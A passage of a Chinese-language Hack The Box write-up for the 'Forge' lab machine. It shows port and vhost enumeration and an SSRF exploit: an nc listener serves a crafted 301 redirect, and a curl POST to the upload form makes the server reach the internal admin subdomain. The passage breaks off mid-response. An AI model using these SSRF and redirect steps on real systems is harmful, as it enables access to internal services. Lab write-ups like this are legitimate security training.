@@ -1,0 +1,823 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：WEB功能分析、VHOSTS枚举、SSRF、301跳转数据包构造、curl工具POST包构造、Python代码构造">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Forge-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/23/Forge-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：WEB功能分析、VHOSTS枚举、SSRF、301跳转数据包构造、curl工具POST包构造、Python代码构造">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Forge-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Forge-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Forge-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Forge-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Forge-htb-writeup/4.png">
+<meta property="article:published_time" content="2024-01-23T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-02-06T12:17:11.929Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Forge-htb-writeup/5.png">
+  
+  
+  
+  <title>Forge-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Forge-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-23 23:50" pubdate>
+          2024年1月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          24k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          197 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Forge-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：WEB功能分析、VHOSTS枚举、SSRF、301跳转数据包构造、curl工具POST包构造、Python代码构造</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2022/01/22/htb-forge.html</code></p>
+<p>参考链接：<code>https://khaoticdev.net/hack-the-box-forge/</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取靶机IP地址：10.10.11.111</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop/tools/htb-portscan]<br>└─$ sudo ./htb-portscan.sh 10.10.11.111 tcp               <br>[sudo] kali 的密码：<br>开始对 10.10.11.111 进行nmap端口扫描...<br>* 正在执行tcp协议的端口扫描探测...<br>sudo nmap -min-rate 10000 -p- <span class="hljs-string">&quot;10.10.11.111&quot;</span> -oG <span class="hljs-string">&quot;10.10.11.111&quot;</span>-tcp-braker-allports<br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-24 16:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.111<br>Host is up (0.35s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE    SERVICE<br>21/tcp filtered ftp<br>22/tcp open     ssh<br>80/tcp open     http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.48 seconds<br>* 正在对开放的端口进行TCP全连接式版本探测和系统版本以及漏洞探测...<br>sudo nmap -sT -sV -sC -O -p<span class="hljs-string">&quot;22,80,&quot;</span> <span class="hljs-string">&quot;10.10.11.111&quot;</span><br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-24 16:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.111<br>Host is up (0.33s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)<br>|   256 79:<span class="hljs-built_in">df</span>:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)<br>|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Did not follow redirect to http://forge.htb<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (93%), Linux 4.15 - 5.8 (93%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%), Linux 5.0 - 5.5 (92%), Linux 3.1 (91%), Linux 3.2 (91%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (90%), Linux 5.0 - 5.4 (89%), Linux 5.4 (89%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.09 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、根据扫描信息，绑定下本地hosts地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop/tools/htb-portscan]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.11.111 forge.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>10.10.11.111 forge.htb<br></code></pre></td></tr></table></figure>
+
+<p>4、分别使用 dirsearch 和 ffuf 扫描下目录信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ dirsearch -u http://forge.htb/   <br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/http_forge.htb/__24-01-24_17-38-25.txt<br><br>Target: http://forge.htb/<br><br>[17:38:25] Starting: <br>[17:40:45] 403 -  274B  - /server-status                                    <br>[17:40:46] 403 -  274B  - /server-status/<br>[17:40:53] 301 -  307B  - /static  -&gt;  http://forge.htb/static/             <br>[17:40:53] 404 -  271B  - /static/api/swagger.yaml                          <br>[17:40:53] 404 -  271B  - /static/api/swagger.json<br>[17:40:53] 404 -  271B  - /static/dump.sql<br>[17:41:02] 200 -  929B  - /upload                                           <br>[17:41:02] 301 -  224B  - /uploads  -&gt;  http://forge.htb/uploads/  <br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u http://forge.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt<br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://forge.htb/FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">uploads                 [Status: 301, Size: 224, Words: 21, Lines: 4, Duration: 324ms]</span><br><span class="hljs-string">static                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 333ms]</span><br><span class="hljs-string">upload                  [Status: 200, Size: 929, Words: 267, Lines: 33, Duration: 315ms]</span><br><span class="hljs-string"></span><br><span class="hljs-string">:: Progress: [81643/81643] :: Job [1/1] :: 31 req/sec :: Duration: [0:12:38] :: Errors: 0 ::</span><br></code></pre></td></tr></table></figure>
+
+<p>5、其实这里也对子域名扫描下，没有发现什么有用的信息的，由于是虚拟靶机地址所以DNS式的爆破是不行，这里需要使用vhost形式枚举才可以，看看是否存在存在其他子域情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ wfuzz -u http://10.10.11.111 -H <span class="hljs-string">&quot;Host: FUZZ.forge.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://10.10.11.111/</span><br><span class="hljs-string">Total requests: 19966</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                 </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000024:   200        1 L      4 W        27 Ch       &quot;admin&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>6、这里是发现了一个子域名的信息的，本地绑定下，并查看下页面情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.11.111 admin.forge.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>[sudo] kali 的密码：<br>10.10.11.111 admin.forge.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Forge-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、那继续，看一下网站的80端口开放情况</p>
+<p><code>http://forge.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Forge-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、80端口的是一个网站，都是图片展示的情况，那继续看下upload目录，这个页面是个文件上传的页面，会把读取到的文件，生成一个链接，而链接对应的内容，就是读取到的文件的内容</p>
+<p><code>http://forge.htb/upload</code></p>
+<p><img src="http://sh1yan.top/photo/Forge-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、通过测试，发现这个页面，存在两种文件上传的方式，一个是本地文件上传，一个是远程文件上传，输入一个错误的网络地址，页面出现了报错信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">An error occured! Error : HTTPConnectionPool(host=<span class="hljs-string">&#x27;10.10.14.6&#x27;</span>, port=80): Max retries exceeded with url: / (Caused by NewConnectionError(<span class="hljs-string">&#x27;&lt;urllib3.connection.HTTPConnection object at 0x7f2ff7c4cf40&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Forge-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、通过挂起一个nc的443端口监听，查看监听到的内容。</p>
+<p><img src="http://sh1yan.top/photo/Forge-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.6] from (UNKNOWN) [10.10.11.111] 39270<br>GET / HTTP/1.1<br>Host: 10.10.14.6:443<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: keep-alive<br></code></pre></td></tr></table></figure>
+
+<p>11、这里可以知道是使用的python的服务进行请求的，且这里是存在SSRF漏洞的，可以任意访问其他地址，通过前面的 admin.forge.htb 域名显示的情况，我们可以本地起一个HTTP服务，然后当靶机访问我们的服务时，然后跳转去读取那个admin子域的信息，然后我们通过查看网站的信息，去看看那个子域名到底是什么信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;HTTP/1.1 301 Moved Permanently&#x27;</span> &gt; response-301 <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Date: Fri, 26 Jan 2024 06:56:12 GMT&#x27;</span> &gt;&gt; response-301   <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Server: Apache/2.4.41 (Ubuntu)&#x27;</span> &gt;&gt; response-301   <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Location: http://admin.forge.htb/&#x27;</span> &gt;&gt; response-301<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">cat</span> response-301                                        <br>HTTP/1.1 301 Moved Permanently<br>Date: Fri, 26 Jan 2024 06:56:12 GMT<br>Server: Apache/2.4.41 (Ubuntu)<br>Location: http://admin.forge.htb/<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 80 &lt; response-301<br>listening on [any] 80 ...<br>connect to [10.10.14.6] from (UNKNOWN) [10.10.11.111] 52036<br>GET / HTTP/1.1<br>Host: 10.10.14.6<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: keep-alive<br><br>^C<br></code></pre></td></tr></table></figure>
+
+<p>12、然后我们使用curl让靶机远程访问下我们的服务端口</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs html">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -X POST -d &#x27;url=http%3A%2F%2F10.10.14.6&amp;remote=1&#x27; http://forge.htb/upload<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Upload an image<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/main.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/upload.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Gallery<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span 